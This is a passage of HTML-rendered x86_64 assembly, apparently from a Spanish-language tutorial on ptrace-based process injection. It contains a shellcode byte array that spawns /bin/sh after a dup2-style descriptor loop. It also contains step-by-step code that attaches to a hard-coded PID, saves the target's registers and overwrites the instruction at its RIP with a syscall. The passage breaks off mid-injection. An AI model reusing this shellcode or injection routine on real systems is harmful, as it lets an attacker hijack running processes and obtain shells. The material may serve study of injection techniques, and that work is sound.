</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span>
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x03</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xed</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span>
</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x49</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x62</span>
</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x69</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x73</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x54</span>
</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe6</span>
</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x6a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span>
</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x3c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0x31</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span>
</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="w">    </span><span class="kd">db</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span><span class="p">,</span><span class="w"> </span><span class="mh">0x90</span>
</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a><span class="no">sc_len</span><span class="w"> </span><span class="kd">equ</span><span class="w"> </span><span class="kc">$</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">shellcode</span>
</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a>
</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="k">section</span><span class="w"> </span><span class="nv">.bss</span>
</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a><span class="w">    </span><span class="nf">regs</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w">  </span><span class="c1">; sizeof(user_regs_struct) en x86_64  (27x8 bytes)</span>
</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="w">    </span><span class="nf">regs_ori</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span>
</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="w">    </span><span class="nf">regs_sys</span><span class="w"> </span><span class="nv">resq</span><span class="w"> </span><span class="mi">27</span><span class="w"> </span>
</span><span id="__span-10-30"><a id="__codelineno-10-30" name="__codelineno-10-30" href="#__codelineno-10-30"></a>
</span><span id="__span-10-31"><a id="__codelineno-10-31" name="__codelineno-10-31" href="#__codelineno-10-31"></a>
</span><span id="__span-10-32"><a id="__codelineno-10-32" name="__codelineno-10-32" href="#__codelineno-10-32"></a><span class="k">section</span><span class="w"> </span><span class="nv">.text</span>
</span><span id="__span-10-33"><a id="__codelineno-10-33" name="__codelineno-10-33" href="#__codelineno-10-33"></a><span class="k">global</span><span class="w"> </span><span class="nv">_start</span>
</span><span id="__span-10-34"><a id="__codelineno-10-34" name="__codelineno-10-34" href="#__codelineno-10-34"></a><span class="nl">_start:</span>
</span><span id="__span-10-35"><a id="__codelineno-10-35" name="__codelineno-10-35" href="#__codelineno-10-35"></a>
</span><span id="__span-10-36"><a id="__codelineno-10-36" name="__codelineno-10-36" href="#__codelineno-10-36"></a><span class="w">    </span><span class="c1">; PID</span>
</span><span id="__span-10-37"><a id="__codelineno-10-37" name="__codelineno-10-37" href="#__codelineno-10-37"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r15</span><span class="p">,</span><span class="w"> </span><span class="mi">26559</span>
</span><span id="__span-10-38"><a id="__codelineno-10-38" name="__codelineno-10-38" href="#__codelineno-10-38"></a>
</span><span id="__span-10-39"><a id="__codelineno-10-39" name="__codelineno-10-39" href="#__codelineno-10-39"></a>
</span><span id="__span-10-40"><a id="__codelineno-10-40" name="__codelineno-10-40" href="#__codelineno-10-40"></a><span class="c1">; 1 Attach y detención del proceso:</span>
</span><span id="__span-10-41"><a id="__codelineno-10-41" name="__codelineno-10-41" href="#__codelineno-10-41"></a>
</span><span id="__span-10-42"><a id="__codelineno-10-42" name="__codelineno-10-42" href="#__codelineno-10-42"></a><span class="w">    </span><span class="c1">; PTRACE_ATTACH</span>
</span><span id="__span-10-43"><a id="__codelineno-10-43" name="__codelineno-10-43" href="#__codelineno-10-43"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-44"><a id="__codelineno-10-44" name="__codelineno-10-44" href="#__codelineno-10-44"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w">          </span><span class="c1">; PTRACE_ATTACH (0x10)</span>
</span><span id="__span-10-45"><a id="__codelineno-10-45" name="__codelineno-10-45" href="#__codelineno-10-45"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">         </span><span class="c1">; PID</span>
</span><span id="__span-10-46"><a id="__codelineno-10-46" name="__codelineno-10-46" href="#__codelineno-10-46"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="nb">rdx</span><span class="w">          </span><span class="c1">; addr</span>
</span><span id="__span-10-47"><a id="__codelineno-10-47" name="__codelineno-10-47" href="#__codelineno-10-47"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">         </span><span class="c1">; data</span>
</span><span id="__span-10-48"><a id="__codelineno-10-48" name="__codelineno-10-48" href="#__codelineno-10-48"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-49"><a id="__codelineno-10-49" name="__codelineno-10-49" href="#__codelineno-10-49"></a>
</span><span id="__span-10-50"><a id="__codelineno-10-50" name="__codelineno-10-50" href="#__codelineno-10-50"></a>
</span><span id="__span-10-51"><a id="__codelineno-10-51" name="__codelineno-10-51" href="#__codelineno-10-51"></a><span class="w">    </span><span class="c1">; WAIT4: </span>
</span><span id="__span-10-52"><a id="__codelineno-10-52" name="__codelineno-10-52" href="#__codelineno-10-52"></a><span class="w">        </span><span class="c1">; Cuando se hace PTRACE_ATTACH, el kernel envía SIGSTOP al proceso objetivo. </span>
</span><span id="__span-10-53"><a id="__codelineno-10-53" name="__codelineno-10-53" href="#__codelineno-10-53"></a><span class="w">        </span><span class="c1">; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  </span>
</span><span id="__span-10-54"><a id="__codelineno-10-54" name="__codelineno-10-54" href="#__codelineno-10-54"></a><span class="w">        </span><span class="c1">; esté efectivamente detenido antes de poder manipularlo.</span>
</span><span id="__span-10-55"><a id="__codelineno-10-55" name="__codelineno-10-55" href="#__codelineno-10-55"></a>
</span><span id="__span-10-56"><a id="__codelineno-10-56" name="__codelineno-10-56" href="#__codelineno-10-56"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">61</span>
</span><span id="__span-10-57"><a id="__codelineno-10-57" name="__codelineno-10-57" href="#__codelineno-10-57"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">            </span><span class="c1">; PID a esperar (-1 para cualquier hijo)</span>
</span><span id="__span-10-58"><a id="__codelineno-10-58" name="__codelineno-10-58" href="#__codelineno-10-58"></a><span class="w">        </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
</span><span id="__span-10-59"><a id="__codelineno-10-59" name="__codelineno-10-59" href="#__codelineno-10-59"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">            </span><span class="c1">; &amp;status</span>
</span><span id="__span-10-60"><a id="__codelineno-10-60" name="__codelineno-10-60" href="#__codelineno-10-60"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">            </span><span class="c1">; options</span>
</span><span id="__span-10-61"><a id="__codelineno-10-61" name="__codelineno-10-61" href="#__codelineno-10-61"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span><span class="w">            </span><span class="c1">; rusage</span>
</span><span id="__span-10-62"><a id="__codelineno-10-62" name="__codelineno-10-62" href="#__codelineno-10-62"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-10-63"><a id="__codelineno-10-63" name="__codelineno-10-63" href="#__codelineno-10-63"></a>
</span><span id="__span-10-64"><a id="__codelineno-10-64" name="__codelineno-10-64" href="#__codelineno-10-64"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-65"><a id="__codelineno-10-65" name="__codelineno-10-65" href="#__codelineno-10-65"></a>
</span><span id="__span-10-66"><a id="__codelineno-10-66" name="__codelineno-10-66" href="#__codelineno-10-66"></a><span class="c1">; 2 Preservación del contexto de ejecución</span>
</span><span id="__span-10-67"><a id="__codelineno-10-67" name="__codelineno-10-67" href="#__codelineno-10-67"></a>
</span><span id="__span-10-68"><a id="__codelineno-10-68" name="__codelineno-10-68" href="#__codelineno-10-68"></a><span class="w">    </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-10-69"><a id="__codelineno-10-69" name="__codelineno-10-69" href="#__codelineno-10-69"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-70"><a id="__codelineno-10-70" name="__codelineno-10-70" href="#__codelineno-10-70"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">12</span><span class="w">   </span><span class="c1">; PTRACE_GETREGS</span>
</span><span id="__span-10-71"><a id="__codelineno-10-71" name="__codelineno-10-71" href="#__codelineno-10-71"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">  </span><span class="c1">; PID</span>
</span><span id="__span-10-72"><a id="__codelineno-10-72" name="__codelineno-10-72" href="#__codelineno-10-72"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w">  </span><span class="c1">; addr</span>
</span><span id="__span-10-73"><a id="__codelineno-10-73" name="__codelineno-10-73" href="#__codelineno-10-73"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w"> </span><span class="c1">; puntero al buffer donde se va almacenar la estructura de registros</span>
</span><span id="__span-10-74"><a id="__codelineno-10-74" name="__codelineno-10-74" href="#__codelineno-10-74"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-75"><a id="__codelineno-10-75" name="__codelineno-10-75" href="#__codelineno-10-75"></a>
</span><span id="__span-10-76"><a id="__codelineno-10-76" name="__codelineno-10-76" href="#__codelineno-10-76"></a><span class="w">    </span><span class="c1">; En este punto, regs contiene:</span>
</span><span id="__span-10-77"><a id="__codelineno-10-77" name="__codelineno-10-77" href="#__codelineno-10-77"></a><span class="w">    </span><span class="c1">; 0x00  r15</span>
</span><span id="__span-10-78"><a id="__codelineno-10-78" name="__codelineno-10-78" href="#__codelineno-10-78"></a><span class="w">    </span><span class="c1">; 0x08  r14</span>
</span><span id="__span-10-79"><a id="__codelineno-10-79" name="__codelineno-10-79" href="#__codelineno-10-79"></a><span class="w">    </span><span class="c1">; 0x10  r13</span>
</span><span id="__span-10-80"><a id="__codelineno-10-80" name="__codelineno-10-80" href="#__codelineno-10-80"></a><span class="w">    </span><span class="c1">; 0x18  r12</span>
</span><span id="__span-10-81"><a id="__codelineno-10-81" name="__codelineno-10-81" href="#__codelineno-10-81"></a><span class="w">    </span><span class="c1">; 0x20  rbp</span>
</span><span id="__span-10-82"><a id="__codelineno-10-82" name="__codelineno-10-82" href="#__codelineno-10-82"></a><span class="w">    </span><span class="c1">; 0x28  rbx</span>
</span><span id="__span-10-83"><a id="__codelineno-10-83" name="__codelineno-10-83" href="#__codelineno-10-83"></a><span class="w">    </span><span class="c1">; 0x30  r11</span>
</span><span id="__span-10-84"><a id="__codelineno-10-84" name="__codelineno-10-84" href="#__codelineno-10-84"></a><span class="w">    </span><span class="c1">; 0x38  r10</span>
</span><span id="__span-10-85"><a id="__codelineno-10-85" name="__codelineno-10-85" href="#__codelineno-10-85"></a><span class="w">    </span><span class="c1">; 0x40  r9</span>
</span><span id="__span-10-86"><a id="__codelineno-10-86" name="__codelineno-10-86" href="#__codelineno-10-86"></a><span class="w">    </span><span class="c1">; 0x48  r8</span>
</span><span id="__span-10-87"><a id="__codelineno-10-87" name="__codelineno-10-87" href="#__codelineno-10-87"></a><span class="w">    </span><span class="c1">; 0x50  rax</span>
</span><span id="__span-10-88"><a id="__codelineno-10-88" name="__codelineno-10-88" href="#__codelineno-10-88"></a><span class="w">    </span><span class="c1">; 0x58  rcx</span>
</span><span id="__span-10-89"><a id="__codelineno-10-89" name="__codelineno-10-89" href="#__codelineno-10-89"></a><span class="w">    </span><span class="c1">; 0x60  rdx</span>
</span><span id="__span-10-90"><a id="__codelineno-10-90" name="__codelineno-10-90" href="#__codelineno-10-90"></a><span class="w">    </span><span class="c1">; 0x68  rsi</span>
</span><span id="__span-10-91"><a id="__codelineno-10-91" name="__codelineno-10-91" href="#__codelineno-10-91"></a><span class="w">    </span><span class="c1">; 0x70  rdi</span>
</span><span id="__span-10-92"><a id="__codelineno-10-92" name="__codelineno-10-92" href="#__codelineno-10-92"></a><span class="w">    </span><span class="c1">; 0x78  orig_rax</span>
</span><span id="__span-10-93"><a id="__codelineno-10-93" name="__codelineno-10-93" href="#__codelineno-10-93"></a><span class="w">    </span><span class="c1">; 0x80  rip</span>
</span><span id="__span-10-94"><a id="__codelineno-10-94" name="__codelineno-10-94" href="#__codelineno-10-94"></a><span class="w">    </span><span class="c1">; 0x88  cs</span>
</span><span id="__span-10-95"><a id="__codelineno-10-95" name="__codelineno-10-95" href="#__codelineno-10-95"></a><span class="w">    </span><span class="c1">; 0x90  eflags</span>
</span><span id="__span-10-96"><a id="__codelineno-10-96" name="__codelineno-10-96" href="#__codelineno-10-96"></a><span class="w">    </span><span class="c1">; 0x98  rsp</span>
</span><span id="__span-10-97"><a id="__codelineno-10-97" name="__codelineno-10-97" href="#__codelineno-10-97"></a><span class="w">    </span><span class="c1">; 0xA0  ss</span>
</span><span id="__span-10-98"><a id="__codelineno-10-98" name="__codelineno-10-98" href="#__codelineno-10-98"></a><span class="w">    </span><span class="c1">; 0xA8  fs_base</span>
</span><span id="__span-10-99"><a id="__codelineno-10-99" name="__codelineno-10-99" href="#__codelineno-10-99"></a><span class="w">    </span><span class="c1">; 0xB0  gs_base</span>
</span><span id="__span-10-100"><a id="__codelineno-10-100" name="__codelineno-10-100" href="#__codelineno-10-100"></a><span class="w">    </span><span class="c1">; 0xB8  ds</span>
</span><span id="__span-10-101"><a id="__codelineno-10-101" name="__codelineno-10-101" href="#__codelineno-10-101"></a><span class="w">    </span><span class="c1">; 0xC0  es</span>
</span><span id="__span-10-102"><a id="__codelineno-10-102" name="__codelineno-10-102" href="#__codelineno-10-102"></a><span class="w">    </span><span class="c1">; 0xC8  fs</span>
</span><span id="__span-10-103"><a id="__codelineno-10-103" name="__codelineno-10-103" href="#__codelineno-10-103"></a><span class="w">    </span><span class="c1">; 0xD0  gs</span>
</span><span id="__span-10-104"><a id="__codelineno-10-104" name="__codelineno-10-104" href="#__codelineno-10-104"></a>
</span><span id="__span-10-105"><a id="__codelineno-10-105" name="__codelineno-10-105" href="#__codelineno-10-105"></a><span class="w">    </span><span class="c1">; Copia de los registros originales del traceee en el buffer de backup</span>
</span><span id="__span-10-106"><a id="__codelineno-10-106" name="__codelineno-10-106" href="#__codelineno-10-106"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs</span><span class="p">]</span><span class="w">       </span><span class="c1">; RSI se usa como puntero de origen y va avanzando</span>
</span><span id="__span-10-107"><a id="__codelineno-10-107" name="__codelineno-10-107" href="#__codelineno-10-107"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span><span class="w">   </span><span class="c1">; RDI se usa como puntero destino y va avanzando</span>
</span><span id="__span-10-108"><a id="__codelineno-10-108" name="__codelineno-10-108" href="#__codelineno-10-108"></a>
</span><span id="__span-10-109"><a id="__codelineno-10-109" name="__codelineno-10-109" href="#__codelineno-10-109"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">27</span><span class="w">               </span><span class="c1">; RCX se usa como contador y se va decrementando hasta 0</span>
</span><span id="__span-10-110"><a id="__codelineno-10-110" name="__codelineno-10-110" href="#__codelineno-10-110"></a><span class="w">    </span><span class="nf">cld</span><span class="w">                       </span><span class="c1">; DF=0 (dirección de copia ascendente)</span>
</span><span id="__span-10-111"><a id="__codelineno-10-111" name="__codelineno-10-111" href="#__codelineno-10-111"></a><span class="w">    </span><span class="nf">rep</span><span class="w"> </span><span class="nv">movsq</span><span class="w">                 </span><span class="c1">; mueve RCX qwords: [RSI] -&gt; [RDI]</span>
</span><span id="__span-10-112"><a id="__codelineno-10-112" name="__codelineno-10-112" href="#__codelineno-10-112"></a>
</span><span id="__span-10-113"><a id="__codelineno-10-113" name="__codelineno-10-113" href="#__codelineno-10-113"></a><span class="w">                    </span><span class="c1">; movsq copia un qword (8 bytes) desde la dirección apuntada por RSI hacia la dirección apuntada por RDI   </span>
</span><span id="__span-10-114"><a id="__codelineno-10-114" name="__codelineno-10-114" href="#__codelineno-10-114"></a><span class="w">                    </span><span class="c1">; rep repite esa operación RCX veces</span>
</span><span id="__span-10-115"><a id="__codelineno-10-115" name="__codelineno-10-115" href="#__codelineno-10-115"></a>
</span><span id="__span-10-116"><a id="__codelineno-10-116" name="__codelineno-10-116" href="#__codelineno-10-116"></a><span class="c1">; -----------------------------------------</span>
</span><span id="__span-10-117"><a id="__codelineno-10-117" name="__codelineno-10-117" href="#__codelineno-10-117"></a>
</span><span id="__span-10-118"><a id="__codelineno-10-118" name="__codelineno-10-118" href="#__codelineno-10-118"></a>
</span><span id="__span-10-119"><a id="__codelineno-10-119" name="__codelineno-10-119" href="#__codelineno-10-119"></a><span class="c1">; 3 Inyección de la instrucción syscall (0x0f 0x05)</span>
</span><span id="__span-10-120"><a id="__codelineno-10-120" name="__codelineno-10-120" href="#__codelineno-10-120"></a>
</span><span id="__span-10-121"><a id="__codelineno-10-121" name="__codelineno-10-121" href="#__codelineno-10-121"></a>
</span><span id="__span-10-122"><a id="__codelineno-10-122" name="__codelineno-10-122" href="#__codelineno-10-122"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nv">regs</span><span class="o">+</span><span class="mh">0x80</span><span class="p">]</span><span class="w">   </span><span class="c1">; Contenido del RIP del proceso tracee (dirección de la próxima instrucción a ejecutar)</span>
</span><span id="__span-10-123"><a id="__codelineno-10-123" name="__codelineno-10-123" href="#__codelineno-10-123"></a>
</span><span id="__span-10-124"><a id="__codelineno-10-124" name="__codelineno-10-124" href="#__codelineno-10-124"></a><span class="w">    </span><span class="c1">; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la dirección actual a la que apunta el RIP del proceso tracee</span>
</span><span id="__span-10-125"><a id="__codelineno-10-125" name="__codelineno-10-125" href="#__codelineno-10-125"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-126"><a id="__codelineno-10-126" name="__codelineno-10-126" href="#__codelineno-10-126"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w">       </span><span class="c1">; PTRACE_PEEKDATA</span>
</span><span id="__span-10-127"><a id="__codelineno-10-127" name="__codelineno-10-127" href="#__codelineno-10-127"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">     </span><span class="c1">; PID</span>
</span><span id="__span-10-128"><a id="__codelineno-10-128" name="__codelineno-10-128" href="#__codelineno-10-128"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">     </span><span class="c1">; addr</span>
</span><span id="__span-10-129"><a id="__codelineno-10-129" name="__codelineno-10-129" href="#__codelineno-10-129"></a><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="nb">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">       </span><span class="c1">; 8 bytes</span>
</span><span id="__span-10-130"><a id="__codelineno-10-130" name="__codelineno-10-130" href="#__codelineno-10-130"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w">     </span><span class="c1">; puntero a data (direccion donde se almacenará la info leída)</span>
</span><span id="__span-10-131"><a id="__codelineno-10-131" name="__codelineno-10-131" href="#__codelineno-10-131"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-10-132"><a id="__codelineno-10-132" name="__codelineno-10-132" href="#__codelineno-10-132"></a>
</span><span id="__span-10-133"><a id="__codelineno-10-133" name="__codelineno-10-133" href="#__codelineno-10-133"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">rsp</span><span class="p">]</span><span class="w"> </span><span class="c1">; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee</span>
</span><span id="__span-10-134"><a id="__codelineno-10-134" name="__codelineno-10-134" href="#__codelineno-10-134"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w"> </span><span class="c1">; Backup del valor original</span>
</span><span id="__span-10-135"><a id="__codelineno-10-135" name="__codelineno-10-135" href="#__codelineno-10-135"></a><span class="w">    </span><span class="nf">and</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFFFFFFFFFFFF0000</span><span class="w"> </span><span class="c1">; limpiar los 2 bytes bajos</span>
</span><span id="__span-10-136"><a id="__codelineno-10-136" name="__codelineno-10-136" href="#__codelineno-10-136"></a><span class="w">    </span><span class="nf">or</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x000000000000050F</span><span class="w">  </span><span class="c1">; insertar syscall (0x0f 0x05 en little-endian)</span>
</span><span id="__span-10-137"><a id="__codelineno-10-137" name="__codelineno-10-137" href="#__codelineno-10-137"></a>
</span><span id="__span-10-138"><a id="__codelineno-10-138" name="__codelineno-10-138" href="#__codelineno-10-138"></a><span class="w">    </span><span class="c1">; PTRACE_POKEDATA (escribir en memoria)</span>
</span><span id="__span-10-139"><a id="__codelineno-10-139" name="__codelineno-10-139" href="#__codelineno-10-139"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-10-140"><a id="__codelineno-10-140" name="__codelineno-10-140" href="#__codelineno-10-140"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w">     </span><span class="c1">; PTRACE_POKEDATA</span>
</span><span id="__span-10-141"><a id="__codelineno-10-141" name="__codelineno-10-141" href="#__codelineno-10-141"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span><span class="w">   </span><span class="c1">; PID</span>
</span><span id="__span-10-142"><a id="__codelineno-10-142" name="__codelineno-10-142" href="#__codelineno-10-142"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">r12</span><span class="w">   </span><span class="c1">; addr </span>
</span><span id="__span-10-143"><a id="__codelineno-10-143" name="__codelineno-10-143" href="#__codelineno-10-143"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r11</span><span class="w">   </span><span class="c1">; valor de 8 bytes a escribir</span>
</span><span id="__span-10-144"><a id="__codelineno-10-144" name="__codelineno-10-144" href="#__codelineno-10-144"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-10-145"><a id="__codelineno-10-145" name="__codelineno-10-145" href="#__codelineno-10-145"></a>
</span><span id="__span-10-146"><a id="__codelineno-10-146" name="__codelineno-10-146" href="#__codelineno-10-146"></a>
